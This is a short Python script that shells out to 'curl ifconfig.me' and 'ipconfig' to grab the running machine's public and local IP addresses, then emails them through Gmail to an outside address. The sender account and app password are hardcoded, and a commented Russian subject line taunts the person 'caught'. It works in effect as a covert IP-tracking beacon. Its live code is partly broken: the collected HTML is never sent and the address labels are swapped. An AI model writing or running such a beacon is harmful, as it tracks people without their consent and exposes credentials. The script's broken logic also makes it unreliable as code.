from os import popen
import email_to
# from email.mime.text import MIMEText
# from smtplib import SMTP


def shape(myhtml):

  smtp = 'smtp.gmail.com'
  sender = "7kipgod@gmail.com"
  destination = "svaller22@gmail.com"

  message = email_to.Message('ONE')
  message.add('TWO')
  message.add('THREE')
  message.style = 'h1 { color: green }'
  # create a password for the app bot and get the password by putting it in brackets
  server = email_to.EmailServer(smtp, 587, sender, "eifjuipuczaxguxb") # https://myaccount.google.com/apppasswords
  server.send_message(message, destination, 'Things are awesome')

  # msg = MIMEText(myhtml, "html")
  # msg["Subject"] = f"Попался, который кусался! {popen('date').read()}"

def send():
    try: shape(f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>""")
    except Exception: shape("ERROR :(")

if __name__ == "__main__": send()